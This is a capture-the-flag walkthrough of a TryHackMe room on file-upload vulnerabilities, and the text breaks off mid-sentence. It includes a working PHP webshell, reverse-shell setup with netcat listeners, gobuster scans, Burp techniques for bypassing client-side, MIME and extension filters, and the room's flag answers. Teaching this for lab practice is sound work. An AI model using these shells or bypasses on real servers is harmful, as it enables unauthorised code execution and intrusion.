::: {}
# Upload Vulnerabilities TryHackme Writeup {#upload-vulnerabilities-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
Room link: https://tryhackme.com/room/uploadvulns Note: This room is for
Premium Members Only. who purchased THM premium membership.
:::

::::::: {.section .e-content field="body"}
:::::: {#8657 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Upload Vulnerabilities TryHackme Writeup {#c386 .graf .graf--h3 .graf--leading .graf--title name="c386"}

<figure id="9f15" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*MiaV4XAgrVRpy2Td.png"
class="graf-image" data-image-id="0*MiaV4XAgrVRpy2Td.png"
data-width="545" data-height="311" data-is-featured="true" />
</figure>

**Room link:**
[https://tryhackme.com/room/uploadvulns](https://tryhackme.com/room/uploadvulns){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/uploadvulns"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is for Premium Members Only. who purchased THM premium
membership.**

Tutorial room exploring some basic file-upload vulnerabilities in
websites. First up, let's deploy the machine to give it a few minutes to
boot. *TryHackMe Upload Vulnerabilities with MIME and Magic Number
Attack*

This skills to be tested and needed to solve the final task of this
walkthrough room are: **reverse shell**, **Burp Suite**, **upload
vulnerability**, and **client-side bypass extension filtering**.

First up, let's deploy the machine to give it a few minutes to boot.

Once you've clicked deploy, you'll need to configure your own computer
to be able to connect.\
*(Note: This is an abnormal step for a TryHackMe machine, but must be
completed in order to access the practical content of this room)*

If you've successfully deployed the machine then the following commands
will already have the IP address filled in. If any of them have
"MACHINE_IP" in them, then you still need to deploy the machine, and the
following instructions will not work.

### Task 1 Getting Started {#9116 .graf .graf--h3 .graf-after--p name="9116"}

**If you're using Linux or MacOS**, open up a terminal and type in the
following command, then hit enter:

``` {#8ac0 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
echo "MACHINE_IP    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm" | sudo tee -a /etc/hosts
```

When you finish the room, run this command to revert the hosts file back
to normal:

``` {#d324 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
sudo sed -i '$d' /etc/hosts
```

**If you're using Windows**, open an Administrator Powershell window by
searching for "Powershell", right clicking on "Windows Powershell", then
clicking "Run as administrator".

<figure id="362f" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*IzM_QmGYizQw2qUn"
class="graf-image" data-image-id="0*IzM_QmGYizQw2qUn" data-width="778"
data-height="633" />
</figure>

Type the following command and hit enter:

``` {#5cc0 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
AC C:\Windows\System32\drivers\etc\hosts "MACHINE_IP   overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm"
```

When you finish the room, use this command to revert the hosts file back
to normal:

``` {#10e2 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="csharp"}
(GC C:\Windows\System32\drivers\etc\hosts | select -Skiplast 1) | SC C:\Windows\System32\drivers\etc\hosts
```

You should now be able to access the virtual machine, so let's get
started!

### Task 2 Introduction {#5910 .graf .graf--h3 .graf-after--p name="5910"}

The purpose of this room is to explore some of the vulnerabilities
resulting from improper (or inadequate) handling of file uploads.
Specifically, we will be looking at:

- [Overwriting existing files on a server]{#d9b3}
- [Uploading and Executing Shells on a server]{#35a1}
- [Bypassing Client-Side filtering]{#9544}
- [Bypassing various kinds of Server-Side filtering]{#6d53}
- [Fooling content type validation checks]{#74b1}

### Task 4 Overwriting Existing Files {#3d65 .graf .graf--h3 .graf-after--li name="3d65"}

Let's go through an example before you try this for yourself. Please
note that demo.uploadvulns.thm will be used for all demonstrations;
however, this site is not available in the uploaded VM. It is purely for
demonstrative purposes.

In the following image we have a web page with an upload form:

<figure id="8edb" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*Bhw93fDjYORnSgIB"
class="graf-image" data-image-id="0*Bhw93fDjYORnSgIB" data-width="555"
data-height="764" />
</figure>

You may need to enumerate more than this for a real challenge; however,
in this instance, let's just take a look at the source code of the page:

<figure id="1e82" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*tLBWCKycpIt-zXXn"
class="graf-image" data-image-id="0*tLBWCKycpIt-zXXn" data-width="662"
data-height="324" />
</figure>

Inside the red box, we see the code that's responsible for displaying
the image that we saw on the page. It's being sourced from a file called
"spaniel.jpg", inside a directory called "images".

Now we know where the image is being pulled from --- can we overwrite
it?

Let's download another image from the internet and call it
**spaniel.jpg**. We'll then upload it to the site and see if we can
overwrite the existing image:

<figure id="a311" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*2nlRtIFl3ss6-w6E"
class="graf-image" data-image-id="0*2nlRtIFl3ss6-w6E" data-width="875"
data-height="590" />
</figure>

<figure id="3d06" class="graf graf--figure graf-after--figure">
<img src="https://cdn-images-1.medium.com/max/800/0*6_X9e1EPNn6tPpNL"
class="graf-image" data-image-id="0*6_X9e1EPNn6tPpNL" data-width="618"
data-height="712" />
</figure>

And our attack was successful! We managed to overwrite the original
**images/spaniel.jpg** with our own copy.

Now, let's put this into practice.

Open your web browser and navigate to **overwrite.uploadvulns.thm**.
Your goal is to overwrite a file on the server with an upload of your
own.

1.  [What is the name of the image file which can be
    overwritten?]{#0f2e}

> ***Answer: mountains.jpg***

1.  [Overwrite the image. What is the flag you receive?]{#b2f8}

> ***Answer: THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}***

### Task 5 Remote Code Execution {#4036 .graf .graf--h3 .graf-after--blockquote name="4036"}

It's all well and good overwriting files that exist on the server.
That's a nuisance to the person maintaining the site, and may lead to
some vulnerabilities, but let's go further; let's go for RCE!

Web shells:

Let's assume that we've found a webpage with an upload form:

<figure id="97a1" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*81tDetBTUvffGLOR"
class="graf-image" data-image-id="0*81tDetBTUvffGLOR" data-width="511"
data-height="252" />
</figure>

Where do we go from here? Well, let's start with a gobuster scan:

<figure id="57d5" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*yoPVmQarnZb_mNNa"
class="graf-image" data-image-id="0*yoPVmQarnZb_mNNa" data-width="875"
data-height="255" />
</figure>

Looks like we've got two directories here --- `uploads`{.markup--code
.markup--p-code} and `assets`{.markup--code .markup--p-code}. Of these,
it seems likely that any files we upload will be placed in the
\"uploads\" directory. We\'ll try uploading a legitimate image file
first. Here I am choosing our cute dog photo from the previous task:

<figure id="0fd9" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*0hNFu7-OPn0-49jP"
class="graf-image" data-image-id="0*0hNFu7-OPn0-49jP" data-width="649"
data-height="339" />
</figure>

<figure id="afe4" class="graf graf--figure graf-after--figure">
<img src="https://cdn-images-1.medium.com/max/800/0*K92NW7_HePXGEAVE"
class="graf-image" data-image-id="0*K92NW7_HePXGEAVE" data-width="649"
data-height="313" />
</figure>

Now, if we go to
[http://demo.uploadvulns.thm/uploads](http://demo.uploadvulns.thm/uploads){.markup--anchor
.markup--p-anchor data-href="http://demo.uploadvulns.thm/uploads"
rel="noopener ugc nofollow noopener" target="_blank"} we should see that
the spaniel picture has been uploaded!

<figure id="9447" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*vJxl_NIy7E2cuNJI"
class="graf-image" data-image-id="0*vJxl_NIy7E2cuNJI" data-width="649"
data-height="350" />
</figure>

<figure id="ba30" class="graf graf--figure graf-after--figure">
<img src="https://cdn-images-1.medium.com/max/800/0*H-oAFRR69nX3N4bx"
class="graf-image" data-image-id="0*H-oAFRR69nX3N4bx" data-width="875"
data-height="452" />
</figure>

Ok, we can upload images. Let's try a webshell now.

As it is, we know that this webserver is running with a PHP back-end, so
we'll skip straight to creating and uploading the shell. In real life,
we may need to do a little more enumeration; however, PHP is a good
place to start regardless.

A simple webshell works by taking a parameter and executing it as a
system command. In PHP, the syntax for this would be:

``` {#e81d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="php"}
<?php
    echo system($_GET["cmd"]);
?>
```

This code takes a GET parameter and executes it as a system command. It
then echoes the output out to the screen.

Let's try uploading it to the site, then using it to show our current
user and the contents of the current directory:

<figure id="41e3" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*hCV848mqNA-PN5BC"
class="graf-image" data-image-id="0*hCV848mqNA-PN5BC" data-width="831"
data-height="163" />
</figure>

Success!

We could now use this shell to read files from the system, or upgrade
from here to a reverse shell. Now that we have RCE, the options are
limitless. Note that when using webshells, it's usually easier to view
the output by looking at the source code of the page. This drastically
improves the formatting of the output.

**Reverse Shells:**

The process for uploading a reverse shell is almost identical to that of
uploading a webshell, so this section will be shorter. We'll be using
the ubiquitous Pentest Monkey reverse shell, which comes by default on
Kali Linux, but can also be downloaded
[here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php){.markup--anchor
.markup--p-anchor
data-href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"
rel="noopener ugc nofollow noopener" target="_blank"}. You will need to
edit line 49 of the shell. It will currently say

``` {#0ffd .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="perl"}
$ip = '127.0.0.1';  // CHANGE THIS
```

--- as it instructs, change `127.0.0.1`{.markup--code .markup--p-code}
to your TryHackMe tun0 IP address, which can be found on the [access
page](https://tryhackme.com/access){.markup--anchor .markup--p-anchor
data-href="https://tryhackme.com/access"
rel="noopener ugc nofollow noopener" target="_blank"}. You can ignore
the following line, which also asks to be changed. With the shell
edited, the next thing we need to do is start a Netcat listener to
receive the connection. `nc -lvnp 1234`{.markup--code .markup--p-code}:

<figure id="e72b" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*-z_zXzokQASwJrR6"
class="graf-image" data-image-id="0*-z_zXzokQASwJrR6" data-width="351"
data-height="66" />
</figure>

Now, let's upload the shell, then activate it by navigating to
[http://demo.uploadvulns.thm/uploads/shell.php](http://demo.uploadvulns.thm/uploads/shell.php){.markup--anchor
.markup--p-anchor
data-href="http://demo.uploadvulns.thm/uploads/shell.php"
rel="noopener ugc nofollow noopener" target="_blank"}. The name of the
shell will obviously be whatever you called it
(`php-reverse-shell.php`{.markup--code .markup--p-code} by default).

The website should hang and not load properly --- however, if we switch
back to our terminal, we have a hit!

<figure id="3f34" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*7gKZgwPOft-YziF3"
class="graf-image" data-image-id="0*7gKZgwPOft-YziF3" data-width="875"
data-height="223" />
</figure>

Once again, we have obtained RCE on this webserver. From here we would
want to stabilise our shell and escalate our privileges, but those are
tasks for another time. For now, it's time you tried this for yourself!

Navigate to `shell.uploadvulns.thm`{.markup--code .markup--p-code} and
complete the questions for this task.

1.  [Run a Gobuster scan on the website using the syntax from the
    screenshot above. What directory looks like it might be used for
    uploads? (N.B. This is a good habit to get into, and will serve you
    well in the upcoming tasks...)]{#23c7}

### Gobuster {#65d0 .graf .graf--h3 .graf-after--li name="65d0"}

``` {#3ef1 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://shell.uploadvulns.thm
```

/resources (Status: 301)\
/assets (Status: 301)

[http://shell.uploadvulns.thm/resources/](http://shell.uploadvulns.thm/resources/){.markup--anchor
.markup--p-anchor data-href="http://shell.uploadvulns.thm/resources/"
rel="noopener ugc nofollow noopener" target="_blank"}

1.  [Get either a web shell or a reverse shell on the machine. What's
    the flag in the /var/www/ directory of the server?]{#f240}

Start Netcat listener

> ***nc -lnvp 9001***

``` {#5488 .graf .graf--pre .graf-after--blockquote .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="shell"}
$ cd /var/www/
$ ls
flag.txt
html
$ cat flag.txt
THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}
```

> ***Answer: THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}***

### Task 6 Filtering {#6ab9 .graf .graf--h3 .graf-after--blockquote name="6ab9"}

Up until now we have largely been ignoring the counter-defences employed
by web developers to defend against file upload vulnerabilities. Every
website that you've successfully attacked so far in this room has been
completely insecure. It's time that changed. From here on out, we'll be
looking at some of the defence mechanisms used to prevent malicious file
uploads, and how to circumvent them.

First up, let's discuss the differences between client-side filtering
and server-side filtering.

When we talk about a script being "Client-Side", in the context of web
applications, we mean that it's running in the user's browser as opposed
to on the web server itself. JavaScript is pretty much ubiquitous as the
client-side scripting language, although alternatives do exist.
Regardless of the language being used, a client-side script will be run
in your web browser. In the context of file-uploads, this means that the
filtering occurs before the file is even uploaded to the server.
Theoretically, this would seem like a good thing, right? In an ideal
world, it would be; however, because the filtering is happening on our
computer, it is trivially easy to bypass. As such client-side filtering
by itself is a highly insecure method of verifying that an uploaded file
is not malicious.

Conversely, as you may have guessed, a server-side script will be run on
the server. Traditionally PHP was the predominant server-side language;
however, in recent years, other options (C#, Node.js, Python, Ruby on
Rails, and a variety of others) have become more widely used.
Server-side filtering tends to be more difficult to bypass, as you don't
have the code in front of you. As the code is executed on the server, in
most cases it will also be impossible to bypass the filter completely;
instead we have to form a payload which conforms to the filters in
place, but still allows us to execute our code.

With that in mind, let's take a look at some different kinds of
filtering.

Extension Validation:

File extensions are used (in theory) to identify the contents of a file.
In practice they are very easy to change, so actually don't mean much;
however, MS Windows still uses them to identify file types, although
Unix based systems tend to rely on other methods, which we'll cover in a
bit. Filters that check for extensions work in one of two ways. They
either blacklist extensions (i.e. have a list of extensions which are
not allowed) or they whitelist extensions (i.e. have a list of
extensions which are allowed, and reject everything else).

**File Type Filtering:**

Similar to Extension validation, but more intensive, file type filtering
looks, once again, to verify that the contents of a file are acceptable
to upload. We'll be looking at two types of file type validation:

- [**MIME validation: MIME (Multipurpose Internet Mail Extension)**
  types are used as an identifier for files --- originally when
  transfered as attachments over email, but now also when files are
  being transferred over HTTP(S). The MIME type for a file upload is
  attached in the header of the request, and looks something like
  this:]{#6a36}

<figure id="62ed" class="graf graf--figure graf-after--li">
<img src="https://cdn-images-1.medium.com/max/800/0*B7vFR0NanK59-dkY"
class="graf-image" data-image-id="0*B7vFR0NanK59-dkY" data-width="762"
data-height="216" />
</figure>

- [MIME types follow the format \<type\>/\<subtype\> . In the request
  above, you can see that the image "spaniel.jpg" was uploaded to the
  server. As a legitimate JPEG image, the MIME type for this upload was
  "image/jpeg". The MIME type for a file can be checked client-side
  and/or server-side; however, as MIME is based on the extension of the
  file, this is extremely easy to bypass.]{#ee4c}
- [Magic Number validation: Magic numbers are the more accurate way of
  determining the contents of a file; although, they are by no means
  impossible to fake. The "magic number" of a file is a string of bytes
  at the very beginning of the file content which identify the content.
  For example, a PNG file would have these bytes at the very top of the
  file: 89 50 4E 47 0D 0A 1A 0A.]{#680d}

<figure id="9b46" class="graf graf--figure graf-after--li">
<img src="https://cdn-images-1.medium.com/max/800/0*JS3oEnDoAUb063Qc"
class="graf-image" data-image-id="0*JS3oEnDoAUb063Qc" data-width="718"
data-height="45" />
</figure>

- [Unlike Windows, Unix systems use magic numbers for identifying files;
  however, when dealing with file uploads, it is possible to check the
  magic number of the uploaded file to ensure that it is safe to accept.
  This is by no means a guaranteed solution, but it's more effective
  than checking the extension of a file.]{#9ee1}

**File Length Filtering:**

File length filters are used to prevent huge files from being uploaded
to the server via an upload form (as this can potentially starve the
server of resources). In most cases this will not cause us any issues
when we upload shells; however, it's worth bearing in mind that if an
upload form only expects a very small file to be uploaded, there may be
a length filter in place to ensure that the file length requirement is
adhered to. As an example, our fully fledged PHP reverse shell from the
previous task is 5.4Kb big --- relatively tiny, but if the form expects
a maximum of 2Kb then we would need to find an alternative shell to
upload.

**File Name Filtering:**

As touched upon previously, files uploaded to a server should be unique.
Usually this would mean adding a random aspect to the file name,
however, an alternative strategy would be to check if a file with the
same name already exists on the server, and give the user an error if
so. Additionally, file names should be sanitised on upload to ensure
that they don't contain any "bad characters", which could potentially
cause problems on the file system when uploaded (e.g. null bytes or
forward slashes on Linux, as well as control characters such
as `;`{.markup--code .markup--p-code} and potentially unicode
characters). What this means for us is that, on a well administered
system, our uploaded files are unlikely to have the same name we gave
them before uploading, so be aware that you may have to go hunting for
your shell in the event that you manage to bypass the content filtering.

**File Content Filtering:**

More complicated filtering systems may scan the full contents of an
uploaded file to ensure that it's not spoofing its extension, MIME type
and Magic Number. This is a significantly more complex process than the
majority of basic filtration systems employ, and thus will not be
covered in this room.

It's worth noting that none of these filters are perfect by
themselves --- they will usually be used in conjunction with each other,
providing a multi-layered filter, thus increasing the security of the
upload significantly. Any of these filters can all be applied
client-side, server-side, or both.

Similarly, different frameworks and languages come with their own
inherent methods of filtering and validating uploaded files. As a
result, it is possible for language specific exploits to appear; for
example, until PHP major version five, it was possible to bypass an
extension filter by appending a null byte, followed by a valid
extension, to the malicious `.php`{.markup--code .markup--p-code} file.
More recently it was also possible to inject PHP code into the exif data
of an otherwise valid image file, then force the server to execute it.
These are things that you are welcome to research further, should you be
interested.

1.  [What is the traditional server-side scripting language?]{#db8e}

> ***Answer: php***

1.  [When validating by file extension, what would you call a list of
    accepted extensions (whereby the server rejects any extension not in
    the list)?]{#1e78}

> ***Answer: whitelist***

1.  [\[Research\] What MIME type would you expect to see when uploading
    a CSV file?]{#912a}

> ***Answer: text/csv***

### Task 7 Bypassing Client-Side Filtering {#a296 .graf .graf--h3 .graf-after--blockquote name="a296"}

We'll begin with the first (and weakest) line of defence: Client-Side
Filtering.

As mentioned previously, client-side filtering tends to be extremely
easy to bypass, as it occurs entirely on a machine that you control.
When you have access to the code, it's very easy to alter it.

There are four easy ways to bypass your average client-side file upload
filter:

1.  [Turn off Javascript in your browser --- this will work provided the
    site doesn't require Javascript in order to provide basic
    functionality. If turning off Javascript completely will prevent the
    site from working at all then one of the other methods would be more
    desirable; otherwise, this can be an effective way of completely
    bypassing the client-side filter.]{#8b29}
2.  [Intercept and modify the incoming page. Using Burpsuite, we can
    intercept the incoming web page and strip out the Javascript filter
    before it has a chance to run. The process for this will be covered
    below.]{#7684}
3.  [Intercept and modify the file upload. Where the previous method
    works before the webpage is loaded, this method allows the web page
    to load as normal, but intercepts the file upload after it's already
    passed (and been accepted by the filter). Again, we will cover the
    process for using this method in the course of the task.]{#69eb}
4.  [Send the file directly to the upload point. Why use the webpage
    with the filter, when you can send the file directly using a tool
    like `curl`{.markup--code .markup--li-code}? Posting the data
    directly to the page which contains the code for handling the file
    upload is another effective method for completely bypassing a client
    side filter. We will not be covering this method in any real depth
    in this tutorial, however, the syntax for such a command would look
    something like this: **curl -X POST -F "submit:\<value\>" -F
    "\<file-parameter\>:@\<path-to-file\>" \<site\>**. To use this
    method you would first aim to intercept a successful upload (using
    Burpsuite or the browser console) to see the parameters being used
    in the upload, which can then be slotted into the above
    command.]{#9c32}

We will be covering methods two and three in depth below.

Let's assume that, once again, we have found an upload page on a
website:

<figure id="f241" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*Ok4bzh7hATM0SABK"
class="graf-image" data-image-id="0*Ok4bzh7hATM0SABK" data-width="534"
data-height="320" />
</figure>

As always, we'll take a look at the source code. Here we see a basic
Javascript function checking for the MIME type of uploaded files:

<figure id="ba01" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*2kDv1ObaFXUfoVTw"
class="graf-image" data-image-id="0*2kDv1ObaFXUfoVTw" data-width="755"
data-height="576" />
</figure>

In this instance we can see that the filter is using a whitelist to
exclude any MIME type that isn't `image/jpeg`{.markup--code
.markup--p-code}.

Our next step is to attempt a file upload --- as expected, if we choose
a JPEG, the function accepts it. Anything else and the upload is
rejected.

Having established this, let's start
[Burpsuite](https://blog.tryhackme.com/setting-up-burp/){.markup--anchor
.markup--p-anchor
data-href="https://blog.tryhackme.com/setting-up-burp/"
rel="noopener ugc nofollow noopener" target="_blank"} and reload the
page. We will see our own request to the site, but what we really want
to see is the server's response, so right click on the intercepted data,
scroll down to "Do Intercept", then select "Response to this request":

<figure id="71d9" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*8zBURQzEL00fcZJV"
class="graf-image" data-image-id="0*8zBURQzEL00fcZJV" data-width="581"
data-height="687" />
</figure>

When we click the "Forward" button at the top of the window, we will
then see the server's response to our request. Here we can delete,
comment out, or otherwise break the Javascript function before it has a
chance to load:

<figure id="344b" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*0E0QP_zFQI1DpBFX"
class="graf-image" data-image-id="0*0E0QP_zFQI1DpBFX" data-width="875"
data-height="740" />
</figure>

Having deleted the function, we once again click "Forward" until the
site has finished loading, and are now free to upload any kind of file
to the website:

<figure id="3693" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*o5x3_9PBAc5y3fpp"
class="graf-image" data-image-id="0*o5x3_9PBAc5y3fpp" data-width="549"
data-height="305" />
</figure>

It's worth noting here that Burpsuite will not, by default, intercept
any external Javascript files that the web page is loading. If you need
to edit a script which is not inside the main page being loaded, you'll
need to go to the "Options" tab at the top of the Burpsuite window, then
under the "Intercept Client Requests" section, edit the condition of the
first line to remove `^js$|`{.markup--code .markup--p-code}:

<figure id="2421" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*WYhGlw-ume7tqy2q"
class="graf-image" data-image-id="0*WYhGlw-ume7tqy2q" data-width="821"
data-height="296" />
</figure>

We've already bypassed this filter by intercepting and removing it prior
to the page being loaded, but let's try doing it by uploading a file
with a legitimate extension and MIME type, then intercepting and
correcting the upload with Burpsuite.

Having reloaded the webpage to put the filter back in place, let's take
the reverse shell that we used before and rename it to be called
"shell.jpg". As the MIME type (based on the file extension)
automatically checks out, the Client-Side filter lets our payload
through without complaining:

<figure id="d31f" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*uZ-w3wldHON4155l"
class="graf-image" data-image-id="0*uZ-w3wldHON4155l" data-width="473"
data-height="306" />
</figure>

Once again we'll activate our Burpsuite intercept, then click "Upload"
and catch the request:

<figure id="6523" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*nPI1Ck7swnokl9VS"
class="graf-image" data-image-id="0*nPI1Ck7swnokl9VS" data-width="756"
data-height="462" />
</figure>

Observe that the MIME type of our PHP shell is currently
`image/jpeg`{.markup--code .markup--p-code}. We\'ll change this to
`text/x-php`{.markup--code .markup--p-code}, and the file extension
from `.jpg`{.markup--code .markup--p-code} to `.php`{.markup--code
.markup--p-code}, then forward the request to the server:

<figure id="388b" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*yL-GANuh22Q3ndb8"
class="graf-image" data-image-id="0*yL-GANuh22Q3ndb8" data-width="587"
data-height="225" />
</figure>

Now, when we navigate to
[http://demo.uploadvulns.thm/uploads/shell.php](http://demo.uploadvulns.thm/uploads/shell.php){.markup--anchor
.markup--p-anchor
data-href="http://demo.uploadvulns.thm/uploads/shell.php"
rel="noopener ugc nofollow noopener" target="_blank"} having set up a
netcat listener, we receive a connection from the shell!

<figure id="dded" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*CjpM5PWPnfCinLqY"
class="graf-image" data-image-id="0*CjpM5PWPnfCinLqY" data-width="875"
data-height="562" />
</figure>

We've covered in detail two ways to bypass a Client-Side file upload
filter. Now it's time for you to give it a shot for yourself! Navigate
to
[java.uploadvulns.thm](https://infosecwriteups.com/ctf-and-walkthrough-writeups/tryhackme/-/blob/master/java.uploadvulns.thm){.markup--anchor
.markup--p-anchor
data-href="https://infosecwriteups.com/ctf-and-walkthrough-writeups/tryhackme/-/blob/master/java.uploadvulns.thm"
rel="noopener ugc nofollow noopener" target="_blank"} and bypass the
filter to get a reverse shell. Remember that not all client-side scripts
are inline! As mentioned previously, Gobuster would be a very good place
to start here --- the upload directory name will be changing with every
new challenge.

``` {#60f3 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
window.onload = function(){
    var upload = document.getElementById("fileSelect");
   var responseMsg = document.getElementsByClassName("responseMsg")[0];
 var errorMsg = document.getElementById("errorMsg");
   var uploadMsg = document.getElementById("uploadtext");
    upload.value="";
    upload.addEventListener("change",function(event){
     var file = this.files[0];
      responseMsg.style = "display:none;";
        if (file.type != "image/png"){
            upload.value = "";
          uploadMsg.style = "display:none;";
          error();
        } else{
         uploadMsg.innerHTML = "Chosen File: " + upload.value.split(/(\\|\/)/g).pop();
           responseMsg.style="display:none;";
          errorMsg.style="display:none;";
         success();
      }
 });
};
```

nc -lnvp 9001

**Question 1**. What is the flag in /var/www/?

> ***Answer: THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}***

### Task 8 Bypassing Server-Side Filtering: File Extensions {#0ac6 .graf .graf--h3 .graf-after--blockquote name="0ac6"}

Time to turn things up another notch!

Client-side filters are easy to bypass --- you can see the code for
them, even if it's been obfuscated and needs processed before you can
read it; but what happens when you can't see or manipulate the code?
Well, that's a server-side filter. In short, we have to perform a lot of
testing to build up an idea of what is or is not allowed through the
filter, then gradually put together a payload which conforms to the
restrictions.

For the first part of this task we'll take a look at a website that's
using a blacklist for file extensions as a server side filter. There are
a variety of different ways that this could be coded, and the bypass we
use is dependent on that. In the real world we wouldn't be able to see
the code for this, but for this example, it will be included here:

``` {#9866 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="php"}
<?php
    //Get the extension
    $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];
    //Check the extension against the blacklist -- .php and .phtml
    switch($extension){
        case "php":
        case "phtml":
        case NULL:
            $uploadFail = True;
            break;
        default:
            $uploadFail = False;
    }
?>
```

In this instance, the code is looking for the last period (.) in the
file name and uses that to confirm the extension, so that is what we'll
be trying to bypass here. Other ways the code could be working include:
searching for the first period in the file name, or splitting the file
name at each period and checking to see if any blacklisted extensions
show up. We'll cover this latter case later on, but in the meantime,
let's focus on the code we've got here.

We can see that the code is filtering out the `.php`{.markup--code
.markup--p-code} and `.phtml`{.markup--code .markup--p-code} extensions,
so if we want to upload a PHP script we\'re going to have to find
another extension. The [wikipedia
page](https://en.wikipedia.org/wiki/PHP){.markup--anchor
.markup--p-anchor data-href="https://en.wikipedia.org/wiki/PHP"
rel="noopener ugc nofollow noopener" target="_blank"} for PHP gives us a
bunch of options we can try \-- many of them bypass the filter (which
only blocks the two aforementioned extensions), but it appears that the
server is configured not to recognise them as PHP files, as in the below
example:

<figure id="5fe5" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*guEjQuhYgc1nMyzQ"
class="graf-image" data-image-id="0*guEjQuhYgc1nMyzQ" data-width="805"
data-height="329" />
</figure>

This is actually the default for Apache2 servers, at the time of
writing; however, the sysadmin may have changed the default
configuration (or the server may be out of date), so it's well worth
trying.

Eventually we find that the **.phar**extension bypasses the
filter --- and works --- thus giving us our shell:

<figure id="373c" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*4j3c2mPff1R6p2SD"
class="graf-image" data-image-id="0*4j3c2mPff1R6p2SD" data-width="875"
data-height="530" />
</figure>

Let's have a look at another example, with a different filter. This time
we'll do it completely black-box: i.e. without the source code.

Once again, we have our upload form:

<figure id="9f10" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*T3aKLN8nYH7pinTy"
class="graf-image" data-image-id="0*T3aKLN8nYH7pinTy" data-width="476"
data-height="278" />
</figure>

Ok, we'll start by scoping this out with a completely legitimate upload.
Let's try uploading the `spaniel.jpg`{.markup--code .markup--p-code}
image from before:

<figure id="c9a1" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*X7EGYL33KsoHoVv9"
class="graf-image" data-image-id="0*X7EGYL33KsoHoVv9" data-width="562"
data-height="292" />
</figure>

Well, that tells us that JPEGS are accepted at least. Let's go for one
that we can be pretty sure will be rejected (`shell.php`{.markup--code
.markup--p-code}):

<figure id="52a0" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*EoNSbQi4irjTWH_f"
class="graf-image" data-image-id="0*EoNSbQi4irjTWH_f" data-width="572"
data-height="314" />
</figure>

Can't say that was unexpected.

From here we enumerate further, trying the techniques from above and
just generally trying to get an idea of what the filter will accept or
reject.

In this case we find that there are no shell extensions that both
execute, and are not filtered, so it's back to the drawing board.

In the previous example we saw that the code was using the
`pathinfo()`{.markup--code .markup--p-code} PHP function to get the last
few characters after the `.`{.markup--code .markup--p-code}, but what
happens if it filters the input slightly differently?

Let's try uploading a file called `shell.jpg.php`{.markup--code
.markup--p-code}. We already know that JPEG files are accepted, so what
if the filter is just checking to see if the .jpg file extension is
somewhere within the input?

Pseudocode for this kind of filter may look something like this:

